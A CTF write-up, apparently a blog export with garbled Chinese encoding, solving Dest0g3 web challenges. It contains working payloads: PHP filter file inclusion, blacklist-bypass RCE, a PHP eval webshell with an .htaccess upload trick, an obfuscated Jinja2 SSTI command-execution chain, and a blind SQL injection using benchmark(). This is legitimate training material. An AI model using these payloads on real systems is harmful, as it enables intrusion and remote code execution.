payloadï¼š\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\nGETä¼ å‚æˆåŠŸè½¬ç åæˆåŠŸå¾—åˆ°flag.flag = &quot;Dest0g3&#123;ef8f9913-9d91-4c88-9773-0810a40f8ad8&#125;[èµ„æ–™æŸ¥é˜…ï¼šrequire_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶]\n\nEasyPHPä¾æ—§ç»™å‡ºæºç ï¼š\n&lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;    echo $fl4g;&#125;else&#123;    echo &quot;Try harder!&quot;;&#125;set_error_handler(    function() use(&amp;$fl4g) &#123;        print $fl4g;    &#125;);$fl4g .= $dest0g3;?&gt;\n\næ˜“çŸ¥éœ€è¦æˆ‘ä»¬POSTæ–¹å¼ä¼ å…¥ctfï¼Œç„¶åæ‹¼æ¥åœ¨$fl4gåé¢ï¼Œè€Œè¾“å‡º$fl4gåªèƒ½æƒ³åŠæ³•è§¦å‘set_error_handler()ã€‚\nè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨æŠŠæ•°ç»„å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥è¿ç®—æ—¶ä¼šæŠ¥é”™è¿™ä¸€ç‚¹\nNotice:Array to string conversion//æŠŠæ•°ç»„å½“æˆäº†å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œè¿›è¡Œ .= è¿ç®—æ—¶ï¼Œä¼šè‡ªåŠ¨æ ¹æ®ç¯å¢ƒéœ€è¦è½¬æ¢æ•°æ®ç±»å‹ï¼ˆechoã€printè¾“å‡ºæ•°ç»„æ—¶ä¹Ÿä¼šæŠ¥è¿™æ ·çš„ä¿¡æ¯ï¼‰\n\næŠŠctfç”¨POSTä¼ å…¥ï¼Œå³payloadctf[]=1\n\n\næˆåŠŸè·å¾—flag.\n\nSimpleRCEæºç ç»™å‡ºï¼š\n&lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt;\n\néœ€è¦æˆ‘ä»¬ç»•è¿‡str_ireplace()å‡½æ•°(ä¸åŒºåˆ†å¤§å°å†™åœ°å¯¹æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ è¿›è¡Œæœç´¢æ›¿æ¢)ä¸Šä¼ å‘½ä»¤ï¼Œä»è€Œå®ç°RCE.\nâ… ã€åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ç”±äºè¿‡æ»¤äº†decodeï¼Œbase64ç¼–ç ä¸èƒ½ä½¿ç”¨ï¼Œæˆ‘ä»¬æƒ³åˆ°åå…­è¿›åˆ¶è½¬æ¢åç»•è¿‡ã€‚è„šæœ¬å¦‚ä¸‹ï¼š\n&lt;?php$a= &quot;system&quot;;$b=&quot;cat *&quot;;//å‘½ä»¤$p=&#x27;sysytem:&#x27;.bin2hex($a).&#x27;&lt;br&gt;command:&#x27;.bin2hex($b);echo $p;?&gt; //sysytem:73797374656d//command:636174202a\n\næ„é€ payload:aaa=hex2bin(&#39;73797374656D&#39;)(hex2bin(&#39;636174202f2a&#39;));//ä¸åŠ ;ä¸è¡ŒæˆåŠŸæ‹¿åˆ°flag.\nâ…¡ã€æ— å‚RCEç›´æ¥è¿‡çœ‹åˆ°çš„ä¸€ç§å¾ˆç‰›çš„åŠæ³•ï¼Œä¸è¿‡è¿˜æ²¡æœ‰å¼„æ¸…åŸç†ã€‚payloadï¼š\nPOSTï¼šaaa=show_source(next(apache_request_headers()));User-Agent: /flag\n\nâ…¢ã€å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–ç»•è¿‡æ–¹æ³•ï¼Œå¦‚å–åç»•è¿‡ï¼šå–ååŸºæœ¬ä¸Šç”¨çš„éƒ½æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œä¸ä¼šè§¦å‘åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚è¿™é‡Œä¸å†èµ˜è¿°ï¼Œç»™å‡ºè„šæœ¬ï¼š\n&lt;?php//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;\n\n[èµ„æ–™æŸ¥é˜…ï¼šæ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“]\n\nfunny_uploadæŸ¥çœ‹é¡µé¢æºä»£ç \n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=&quot;javascript&quot;&gt;function Checkfiles()&#123;var fup = document.getElementById(&#x27;file&#x27;);var fileName = fup.value;var ext = fileName.substring(fileName.lastIndexOf(&#x27;.&#x27;) + 1);if(ext == &quot;gif&quot; || ext == &quot;GIF&quot; || ext == &quot;JPEG&quot; || ext == &quot;jpeg&quot; || ext == &quot;jpg&quot; || ext == &quot;JPG&quot; || ext == &quot;png&quot; || ext == &quot;PNG&quot;)&#123;return true;&#125;else&#123;alert(&quot;è¿™ä¸ªæ–‡ä»¶ä¸å¥½ï¼Œæˆ‘ä¸å–œæ¬¢&quot;);return false;&#125;&#125;&lt;/script&gt;&lt;form method=&quot;post&quot; onsubmit=&quot;return Checkfiles()&quot; enctype=&quot;multipart/form-data&quot; &gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;    &lt;input  type=&quot;submit&quot; name=&quot;1&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;alert(&#x27;æ–‡ä»¶å†…å®¹ä¹Ÿæ”¹æ”¹å‘—~&#x27;);&lt;/script&gt;\n\nå¯çŸ¥å‰ç«¯å¯¹æ–‡ä»¶è¿›è¡Œäº†ç»•è¿‡ï¼Œä¸”å¯¹æ–‡ä»¶å†…å®¹ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œå°è¯•base64ç¼–ç ç»•è¿‡ï¼š\n&lt;?php @eval($_POST[1]); ?&gt;base64ç¼–ç â€”â€”&gt;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n\n\n\nä¸Šä¼ æˆåŠŸï¼æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•æŠŠè¿™ä¸ªä¸Šä¼ çš„.pngæ–‡ä»¶è§£æä¸º.phpæ–‡ä»¶ã€‚\näº†è§£åˆ°.htaccessæ–‡ä»¶(æˆ–è€…&quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;ï¼‰\n\nhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚\n\nå…¶ä¸­AddtypeæŒ‡ä»¤å¯ä»¥å°†ç»™å®šçš„æ–‡ä»¶æ‹“å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹ï¼š\nAddType media-type extension [extension] ... ç¤ºä¾‹ï¼šAddType application/x-httpd-php .gif å°†ä»¥ gif ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æAddType application/x-httpd-php png  jpg gifå°†ä»¥ä¸Šçš„å¤šä¸ªåç¼€éƒ½å½“ä½œphpè§£æã€‚\n\nå¹¶ä¸”ï¼Œé€šè¿‡ php_value æ¥è®¾ç½® auto_prepend_file æˆ–è€… auto_append_file é…ç½®é€‰é¡¹åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼ŒåŒæ—¶åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•é‡Œéœ€è¦æœ‰å¯è§£æçš„phpæ–‡ä»¶æ¥è§¦å‘ã€‚\nç»“åˆä»¥ä¸Šä¸¤ä¸ªæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼š\nAddtype application/x-httpd-php .jpg#å°†ä»¥ jpg ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=webshell.jpg&quot;#é…åˆphpä¼ªåè®®+åŒ…å«â€œå‡½æ•°â€å®ç°æ–‡ä»¶æ‰§è¡Œ \n\n\n\nä¿®æ”¹è¯·æ±‚åŒ…ä¸Šä¼ æˆåŠŸã€‚\næŒ‰ç…§è·¯å¾„æ‰“å¼€webshell.jpg-&gt;å½“ä½œphpè§£æ-&gt;è§¦å‘php_value auto_append_fileæŒ‡ä»¤-&gt;æ‰§è¡Œæºç \n\n\nè¿æ¥èšå‰‘ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°Flag.\n\n\n[æŸ¥é˜…èµ„æ–™ï¼š.htaccessçš„åˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§]\n\nEasySSTI\n\nä¸Šæ¥å°±è®©æˆ‘ä»¬ç™»å½•ï¼ˆæˆªè¿™å¼ å›¾å®Œå…¨å› ä¸ºbackgroundå¥½çœ‹å“ˆå“ˆå“ˆâ¤ï¼‰\næ ¹æ®é¢˜ç›®åç§°æç¤ºï¼Œè¿™é¢˜è€ƒå¯Ÿæˆ‘ä»¬SSTIã€‚è¡¥ä¹ äº†ä¸€äº›SSTIçš„çŸ¥è¯†åã€æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ã€‘ï¼Œå…ˆç”¨bpæŠ“åŒ…ï¼Œæ‰¾æ³¨å…¥ç‚¹ï¼šå‘ç°åœ¨usernameå¤„æœ‰jinja2æ¨¡æ¿å¼•æ“çš„SSTIæ¼æ´ã€‚äºæ˜¯ç”¨&#39;&#39;.__class__ç­‰è¿›è¡Œç®€å•æµ‹è¯•ï¼Œå‘ç°_ï¼Œ&#39;ï¼Œ&quot;ï¼Œ ï¼Œ[éƒ½è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯ç”¨&#123;&#123;().request.args.class&#125;&#125;&amp;class=__class__å°è¯•ç»•è¿‡ï¼Œç»“æœrequestä¹Ÿè¢«è¿‡æ»¤ã€‚ï¼ˆäº‹å®ä¸Šglobalsï¼Œgetitemï¼Œosï¼Œreadï¼Œpopenï¼Œpopä¹Ÿéƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘è¿˜æ²¡æœ‰æµ‹å‡ºæ¥ï¼‰ä»å…¶ä»–å¸ˆå‚…é‚£é‡Œpiaoåˆ°å°å§¿åŠ¿ï¼š&#123;&#123;config&#125;&#125;å¯ä»¥ç”¨æ¥æŸ¥çœ‹é…ç½®ä¿¡æ¯ï¼Œé€šè¿‡è¿™ä¸ªæˆ–è®¸èƒ½å¤Ÿæ„é€ å‡ºæˆ‘è¦çš„payload\n&amp;lt;Config &#123;&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: None, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: None, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: None, &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093&#125;&amp;gt;\n\næ‰¾åˆ°\\ï¼Œå¯ä»¥åˆ©ç”¨config|string|listè·å–ä»¥æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹æ ¹ç›®å½•â€¦â€¦æ¥ç»­ç¿»æŸ¥èµ„æ–™äº†è§£åˆ°ï¼š\n1. pythonä¸‹çš„æ•°æ®æ‹¼æ¥join æ–¹æ³• æ‹¼æ¥å­—å…¸ï¼Œä¸»è¦ç”¨äºç´¢å¼•ä¸Šçš„åˆå¹¶:é»˜è®¤æŒ‰ç´¢å¼•åˆå¹¶ï¼Œå¯ä»¥åˆå¹¶ç›¸åŒæˆ–ç›¸ä¼¼çš„ç´¢å¼•ï¼Œä¸ç®¡ä»–ä»¬æœ‰æ²¡æœ‰é‡å åˆ—2. &#123;&#123;()|select|string|list&#125;&#125;  or  &#123;&#123;lipsum|select|string|list&#125;&#125;     è·å–å­—ç¬¦åˆ—è¡¨  3. &#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;å‘½ä»¤æ‰§è¡Œ\n\n\n\nç”±æ­¤å¯ä»¥ç”¨è¯¸å¦‚ä»¥ä¸‹çš„æ–¹å¼æ„é€ æˆ‘ä»¬éœ€è¦çš„è¢«â€œè¿‡æ»¤â€çš„å…³é”®å­—ï¼š\n#æ„é€ po=&quot;pop&quot;     #åˆ©ç”¨dict()|joinæ‹¼æ¥å¾—åˆ°&#123;% set po=dict(po=a,p=a)|join%&#125; #æ„é€ a=(()|select|string|list).pop(24),è¿™é‡Œaå³ä¸‹åˆ’çº¿_&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125; #æ„é€ ini=&quot;__init__&quot;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125; #æ„é€ glo=&quot;__globals__&quot;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125; #æ„é€ geti=&quot;__getitem__&quot;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125; #æ„é€ built=&quot;__builtins__&quot;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125; #æ„é€ sub=&quot;__subclasses__&quot;&#123;% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%&#125;#æ„é€ chr()å‡½æ•°è°ƒç”¨&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;#æ„é€ file=&#x27;/flag&#x27;&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;\n\n\nå›åˆ°è¿™ä¸€é¢˜ï¼Œå› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ç”¨%0aæ¢è¡Œç¬¦ç»•è¿‡ã€‚å‘½ä»¤æ‰§è¡Œpayloadæ„é€ è¿‡ç¨‹ï¼š\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;                        #pop&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;          #_&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;  #globals&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125; #getitem&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;                  #popen&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;               #readdict(o=a,s=a)|join()                #è·å– os(config|string|list)|attr(po)(279)  #è·å–  /&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;&lt;==&gt;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;\n\næˆåŠŸæ„é€ payloadï¼š\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n\n\nä¿®æ”¹payloadï¼Œå°†lsæ”¹ä¸ºls /ï¼Œä¸Šè¿°dictæ‹¼æ¥åŠæ³•ä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘æ“ä½œæœ‰é—®é¢˜ï¼‰ï¼Œç›´æ¥()|select|string|listä¸€ä¸ªä¸ªè·å–ï¼š\n((()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(18),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279))|join()\n\nå‘ç°flagåæŒ‰ç…§ä¸Šè¿°åŠæ³•å°†å‘½ä»¤ä¿®æ”¹ä¸ºcat /flagï¼š\n((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join()\n\næˆåŠŸè·å–FLAGï¼Œæœ€åç»™å‡ºæœ€ç»ˆå®Œæ•´çš„Payloadï¼š\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()&#125;&#125;","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022Dest0g3-520è¿æ–°èµ›-web(éƒ¨åˆ†)","url":"/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/","content":"æœ€è¿‘èº«ä½“æŠ±æ™ï¼Œç»ˆäºç¼“è¿‡åŠ²æ¥ç»§ç»­ç€æ‰‹å­¦ä¹ ã€åšé¢˜ã€‚ä¸€æ–¹é¢å¯¹SQLæ³¨å…¥åŸºç¡€å’Œæ•°æ®åº“åŸºç¡€åšäº†ä¸€å®šçš„çŸ¥è¯†è¡¥å……ï¼Œå¦ä¸€æ–¹é¢æ¥ç€æŠ•å…¥åˆ°æš‘å‡æ—¶æœªç«Ÿçš„Dest0g3-520è¿æ–°èµ›ä¸Šã€‚æ„Ÿå…´è¶£çš„æœ‹å‹ä»¬å¯ä»¥åˆ°æˆ‘çš„åšå®¢è½¬è½¬ Latteâ€™s Blog ï¼Œä¹Ÿæ¬¢è¿å¤§å®¶ä¸ºæˆ‘æå–ä¸€äº›å®è´µçš„æ„è§ã€‚\né¢˜ç›®åœ°å€\nReally Easy SQLç½‘ç«™titleå‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªâ€œç²¾ç¾çš„é’“é±¼ç«™â€ï¼Œå¤§æŠµæ˜¯ç”¨æ¥è¯±æƒ‘ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ï¼Œç„¶åå°†ä»–ä»¬å­˜å‚¨åˆ°æ•°æ®åº“ä¸­å»ã€‚è¾“å…¥ä¸€äº›è´¦å·å¯†ç è¿›å»å°è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¸ä¼šå›æ˜¾æœ‰ç”¨ä¿¡æ¯ï¼Œå·®ä¸å¤šå¯ä»¥åˆ¤æ–­æ˜¯ä¸€é“insertå‹çš„ç›²æ³¨é¢˜äº†ã€‚é¢˜ç›®ç»™å‡ºäº†Hintï¼š\nReally Easy SQL insertå‹æ³¨å…¥$black_list=array(&#x27;union&#x27;,&#x27;updatexml&#x27;,&#x27;order&#x27;,&#x27;by&#x27;,&#x27;substr&#x27;,&#x27;and&#x27;,&#x27;extractvalue&#x27;,&#x27;;&#x27;,&#x27;sleep&#x27;,&#x27;join&#x27;,&#x27;alter&#x27;,&#x27;handler&#x27;,&#x27;char&#x27;,&#x27;+&#x27;,&#x27;/&#x27;,&#x27;like&#x27;,&#x27;regexp&#x27;,&#x27;offset&#x27;,&#x27;sleep&#x27;,&#x27;case&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,&#x27;hex&#x27;,&#x27;%0&#x27;,&#x27;load&#x27;,&#x27; &#x27;);\nè¢«banæ‰äº†è®¸å¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬æ—¶é—´ç›²æ³¨å¸¸ç”¨çš„å‡½æ•°sleepï¼Œæ²¡å…³ç³»ï¼Œæˆ‘ä»¬è¿˜æœ‰benchmarkå¯ä»¥ç”¨ã€‚\n\nè¿™é‡Œç»™å‡ºä¸€äº›æ—¶é—´ç›²æ³¨å¸¸ç”¨çš„å‡½æ•°ï¼š\n\nsleep()                      //å»¶è¿Ÿå‡½æ•°BENCHMARK(count,expr)å‡½æ•°    //å°†exprè¯­å¥æ‰§è¡Œcountæ¬¡æ¥è¾¾åˆ°å»¶è¿Ÿçš„ç›®çš„ï¼Œè¿”å›å€¼ä¸º0if(condition,true,false)     //æ¡ä»¶è¯­å¥Ifè¡¨è¾¾å¼ï¼šIF(expr1,expr2,expr3)/* å¦‚æœ expr1 æ˜¯TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)ï¼Œåˆ™ IF()çš„è¿”å›å€¼ä¸ºexpr2; å¦åˆ™è¿”å›å€¼åˆ™ä¸º expr3 */ascii()                     //è½¬æ¢æˆasciiç substring(&quot;string&quot;,strart,length) //mid()ä¹Ÿä¸€æ ·ï¼Œå–å‡ºå­—ç¬¦ä¸²é‡Œçš„ç¬¬å‡ ä½å¼€å§‹ï¼Œé•¿åº¦å¤šå°‘çš„å­—ç¬¦Midå‡½æ•°ï¼šMID(column_name,start[,length])\n\nç”¨benchmarkæ–¹æ³•æµ‹è¯•ä¸€ä¸‹ï¼ˆç©ºæ ¼è¢«banäº†ï¼Œæ‰€ä»¥ç”¨%a0è¿‡æ»¤ã€‚å‰åçš„&#39;æ˜¯ä¸ºäº†é—­åˆï¼Œé™¤æ­¤å¤–ï¼Œè¿˜å¯ä»¥é‡‡ç”¨(ç­‰æ–¹å¼ï¼‰ï¼š\na&#x27;or%a0benchmark(1000000,sha(1))or&#x27;\n\n\næµ‹è¯•å»¶æ—¶åœ¨4så·¦å³ã€‚\n\nå…³äºinsertæ³¨å…¥çš„åŸç†ï¼Œæˆ‘è¿™é‡Œç•™ä¸€ä¸ªç–‘é—®ã€‚å¯¹äºè¿™é“é¢˜ç›®è€Œè¨€ï¼Œusernameæ˜¾ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å‹ï¼Œè€Œbenchmarkå‡½æ•°è¿”å›å€¼ä¸º0ï¼Œå¦‚æœinsertè¯­å¥å¦‚ä¸‹\n\ninsert into ctf_test values(&#x27;a&#x27;or%a0benchmark(1000000,sha(1))or&#x27;&#x27;,&#x27;123456&#x27;);\n\né‚£ä¹ˆSQLä¸ºä»€ä¹ˆä¸ä¼šå› ä¸ºé”™è¯¯Truncated incorrect DOUBLE value: &#39;a&#39;è€Œæ— æ•ˆï¼Ÿä¸‹å›¾æ˜¯æˆ‘åœ¨æœ¬åœ°MySQLè¿›è¡Œæµ‹è¯•çš„ç»“æœã€‚å¯ä»¥çœ‹åˆ°ï¼Œå½“æ²¡æœ‰aæ—¶ä¼šæˆåŠŸæ‰§è¡Œbenchmarkå‡½æ•°ï¼Œå¹¶æŠŠè¿”å›çš„0ä½œä¸ºå­—ç¬¦å‹å­˜å…¥æ•°æ®åº“è¡¨ã€‚è€Œæœ‰aæ—¶ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚ï¼ˆåœ¨åé¢çš„å°è¯•ä¸­ï¼Œå‘ç°æŠŠaæ”¹æˆå…¶ä»–æ•°å­—ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸæ‰§è¡Œçš„ï¼‰\n\n\n\næ¥ä¸‹æ¥å›é¡¾ä¸€äº›å¸¸ç”¨çš„SQL SELECTæ“ä½œ\n// çˆ†è¡¨åselect(group_concat(table_name))from(information_schema.tables)where(table_schema=database());// çˆ†å­—æ®µåï¼ˆåˆ—åï¼‰select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;test&#x27;);  // 